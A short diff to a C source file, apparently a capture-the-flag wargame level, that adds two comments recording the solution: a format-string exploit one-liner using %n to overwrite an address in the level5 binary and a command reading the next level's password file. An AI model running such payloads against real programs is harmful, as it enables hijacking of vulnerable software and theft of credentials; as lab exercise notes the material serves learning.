@@ -16,6 +16,8 @@ void n(void)
     exit(1);
 }
 
+// (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | /home/user/level5/level5
+// cat /home/user/level6/.pass
 int main(void)
 {
     n();
